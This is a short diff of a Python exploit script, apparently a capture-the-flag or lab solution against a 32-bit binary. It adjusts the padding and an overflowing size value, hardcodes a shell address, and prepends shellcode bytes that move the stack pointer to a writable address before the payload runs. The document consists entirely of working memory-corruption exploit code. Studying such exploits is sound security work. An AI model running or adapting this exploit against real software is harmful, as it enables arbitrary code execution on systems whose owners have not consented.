@@ -12,12 +12,13 @@ Done with OF: 0x080488e6
 '''
 addr = lambda x: pack('<I',x)
 
-pad = 16+4*7+4*0
+pad = 16+4*7
 align = 1
-size = (0xffffffff)//4+0
+size = (0xffffffff)//4
 # shell_addr=0xbbbbbbbb
 shell_addr = 0xfffed6ef
 
+# mov    esp,0xfffed6e0; force corrupted esp to somewhere writable
 shellcode=b"\xBC\xE0\xD6\xFE\xFF"+shellcode
 
 sys.stdout.buffer.write(addr(size))
